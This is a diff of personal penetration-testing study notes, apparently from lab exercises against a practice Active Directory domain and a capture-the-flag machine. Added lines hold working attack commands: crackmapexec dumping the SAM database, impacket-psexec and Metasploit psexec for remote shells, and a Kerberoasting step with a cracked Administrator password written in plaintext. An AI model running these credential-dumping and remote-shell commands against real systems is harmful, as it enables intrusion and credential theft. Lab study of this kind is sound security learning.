@@ -3093,13 +3093,13 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 
 > [!todo] 
 > Dump SAM file:
-> `rackmapexec smb 192.168.203.0/24 -u fcastle -d MARVEL.local -p Password1` 
+> `crackmapexec smb 192.168.203.0/24 -u fcastle -d MARVEL.local -p Password1 --sam` 
 
 ![[Pasted image 20230323090210.png]]
 
 > [!todo] 
 > Get Shell on Windows VM:
-> `mpacket-psexec marvel/fcastle:Password1@192.168.203.137` 
+> `impacket-psexec marvel/fcastle:Password1@192.168.203.137` 
 
 ![[Pasted image 20230323090640.png]]
 
@@ -3391,6 +3391,34 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 
 ### Abusing GPP: Part 2
 
+#### Try my own way to Pwn DC
+
 > [!note] 
 > Try to login and try to escalate privilage by myself:
->  
+>  Use Kerberoasting Attack to get Hash of Administrator and crack it:
+
+![[Pasted image 20230329164707.png]]
+
+![[Pasted image 20230329164810.png]]
+
+> [!success] 
+> Username: Administrator
+> Password: Ticketmaster1968
+> 
+
+
+> [!todo] 
+> `crackmapexec smb 10.10.10.100  -u "Administrator" -p Ticketmaster1968` 
+
+![[Pasted image 20230329165407.png]]
+
+> [!todo] 
+> `msfconsole`
+> `use exploit/windows/smb/psexec`
+
+![[Pasted image 20230329165843.png]]
+
+![[Pasted image 20230329170029.png]]
+
+![[Pasted image 20230329170636.png]]
+
